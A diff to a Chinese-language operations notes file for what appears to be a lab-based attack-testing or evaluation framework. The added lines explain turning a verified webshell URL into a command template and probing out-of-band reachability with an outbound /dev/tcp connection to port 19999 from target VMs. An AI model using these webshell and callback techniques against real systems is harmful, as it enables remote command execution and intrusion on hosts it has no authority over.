@@ -53,3 +53,11 @@ POST {PRIVATE_QA_URL}  multipart 字段 sample;头 X-SPECTRE-Token
 - 泛化探针:holdout 独立矩阵残留率(当前 6/10,公共语料配置 5/10)——训练矩阵全绿+holdout 高残留=背题,禁止为 holdout 加规则
 - 边界台账:字节码族不可及结构面(implements/类型引用)如实在账;缓期项(真引擎 key/EXE 车道/行为级)每项带理由与解冻条件
 - 审计行数单调递增=纪律存续;一次性绑定 verify 通过率=100%(交付即绑)
+
+## 通道实操指引(2026-09 终局复盘补)
+- web 通道一键导入:已验证 webshell URL 形如 `http://h/p.php?c=<原样>` →
+  register 时把命令参数位换成 {CMD} 即模板(如 `...?c={CMD}`);响应有页面
+  噪声则尾部加 `#MK` 定界。目标自身输出干净时 curl 直发也合规(审计走台账)
+- OOB 19999 拓扑核验(逐 VM 必测,勿默认可达):qemu user-net 网关=10.0.2.2
+  (宿主回环可达);自定义 netns 容器靶可能不可达——开战先发探针
+  `echo probe > /dev/tcp/<gw>/19999` 收到回执再用;不可达则走落盘+通道读
